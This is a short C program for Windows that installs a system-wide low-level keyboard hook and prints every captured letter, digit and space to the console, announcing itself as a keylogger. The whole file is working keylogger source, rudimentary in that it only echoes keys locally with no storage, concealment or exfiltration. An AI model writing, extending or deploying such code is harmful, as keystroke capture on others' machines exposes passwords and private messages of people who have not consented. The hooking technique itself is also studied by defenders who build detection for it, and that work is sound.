#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Placeholder for keyboard event handling logic
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYUP) {
            if (pKeyboard->vkCode >= 'A' && pKeyboard->vkCode <= 'Z') {
                printf("%c", pKeyboard->vkCode + 32);
            }
            else if (pKeyboard->vkCode >= 'a' && pKeyboard->vkCode <= 'z') {
                printf("%c", pKeyboard->vkCode - 32); 
            }
            else if (pKeyboard->vkCode >= '0' && pKeyboard->vkCode <= '9') {
                printf("%c", pKeyboard->vkCode); 
            }
            else if (pKeyboard->vkCode == VK_SPACE) {
                printf(" ");
            }
        }
    }   
    return CallNextHookEx(NULL, nCode, wParam, lParam);

}

int main() {
    printf("Keylogger started !\n");
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (hHook == NULL) {
        printf("Failed to set hook: %ld\n", GetLastError());
        return 1;
    }  
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}